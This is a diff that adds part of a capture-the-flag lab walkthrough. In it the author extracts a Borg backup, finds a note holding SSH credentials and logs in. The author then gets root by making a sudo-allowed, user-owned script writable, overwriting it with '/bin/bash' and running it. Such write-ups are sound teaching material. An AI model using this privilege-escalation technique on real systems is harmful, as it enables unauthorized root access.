@@ -186,3 +186,126 @@ I also downloaded the tar file at http://target.thm/admin/archive.tar. I extract
 ```bash
 $ tar -xvf archive.tar
 ```
+
+This created a folder named home. All the files are in the path `home/field/dev/final_archive`. Inside of this directory there is a `README` file. I read its contents:
+
+```bash
+$ cat README
+This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
+```
+
+I went to that site and found that it is a tool called borg. I read the documentation and tried to run it on the attack machine but it was not a recognized command so I installed it:
+
+```bash
+$ apt install borgbackup
+```
+
+Looking at the documentation, I found a list command and I want to try it. I moved up one directory before running the command. It asked for a password so I used the one that john cracked:
+
+```bash
+$ cd ../
+$ borg list final_archive
+music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
+```
+
+This means that there is an archive called music_directory and the password found earlier will allow me to extract it. I extract the archive with the following command:
+
+```bash
+$ borg extract final_archive/::music_archive
+```
+
+A new directory showed up called home. To be clear, I started in my home directory (/root) and my current path is:
+
+```bash
+$ pwd
+/root/home/field/dev/
+$ ls
+home  final_archive
+```
+
+There is a file from my current directory at home/alex/Documents/note.txt. I get the contents of that file:
+
+```bash
+$ cat home/alex/Documents/note.txt
+Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
+
+alex:REDACTED
+```
+
+I try those credentials with ssh.
+
+I have a shell. I'm in!
+
+I look around the home directory and grab the user.txt flag:
+
+```bash
+$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
+$ cat user.txt
+REDACTED
+```
+
+## Escalating Privileges
+
+I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) and have some luck with `sudo -l`:
+
+```bash
+$ sudo -l
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+```
+
+I want to look at the directory this file is in and what the permissions for the file are so I run:
+
+```bash
+$ ls -lha /etc/mp3backups/
+total 28K
+drwxr-xr-x   2 root root 4.0K Dec 30  2020 .
+drwxr-xr-x 133 root root  12K Dec 31  2020 ..
+-rw-r--r--   1 root root  339 Jul 16 11:06 backed_up_files.txt
+-r-xr-xr-x   1 alex alex 1.1K Jul 16 11:05 backup.sh
+-rw-r--r--   1 root root   45 Jul 16 11:06 ubuntu-scheduled.tgz
+```
+
+Since alex owns the backup.sh file, I can add write permissions and alter the file. I do that with the command:
+
+```bash
+$ chmod 777 /etc/mp3backups/backup.sh
+```
+
+I check to make sure they got added:
+
+```bash
+$ ls -lha /etc/mp3backups/
+total 28K
+drwxr-xr-x   2 root root 4.0K Dec 30  2020 .
+drwxr-xr-x 133 root root  12K Dec 31  2020 ..
+-rw-r--r--   1 root root  339 Jul 16 11:06 backed_up_files.txt
+-rwxrwxrwx   1 alex alex 1.1K Jul 16 11:05 backup.sh
+-rw-r--r--   1 root root   45 Jul 16 11:06 ubuntu-scheduled.tgz
+```
+
+Now that I have write permission I am going to make the script spawn a shell and since I am running that script as sudo, that will make me root. I run the following:
+
+```bash
+$ echo '/bin/bash' > /etc/mp3backups/backup.sh
+$ sudo /etc/mp3backups/backup.sh
+```
+
+It worked. I'm in! The cursor changed to the # character to let me know that I am root.
+
+Now I grab the root.txt flag:
+
+```bash
+# whoami
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+REDACTED
+```
